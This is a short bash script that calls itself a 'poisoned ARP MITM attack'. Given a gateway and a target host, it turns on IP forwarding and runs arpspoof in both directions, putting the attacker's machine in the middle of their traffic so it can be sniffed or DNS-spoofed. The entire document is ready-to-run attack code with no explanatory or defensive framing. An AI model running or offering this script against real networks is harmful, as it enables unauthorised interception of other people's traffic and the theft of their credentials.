echo Simple poisoned ARP MITM attack
echo Use this to sniff/dnsspoof in switched network

if [ $(whoami) != "root" ]; then
	echo You have to be root \;P
	exit;
fi;

if [ -z "$2" ]; then
	echo Usage: $0 gateway target
	exit;
fi;

echo "$1" \<---\> YOU \<---\> "$2"; echo;

cleanup() {
	kill -2 $(jobs -p); > /dev/null 2>&1
	kill -9 $(jobs -p); > /dev/null 2>&1
	echo All background jobs stoped!
	exit;
}

trap "cleanup" SIGINT;
echo 1 > /proc/sys/net/ipv4/ip_forward
# sysctl -w net.inet.ip.forwarding=1
arpspoof -t "$2" "$1" &
arpspoof -t "$1" "$2" &
while true; do sleep 100; done;
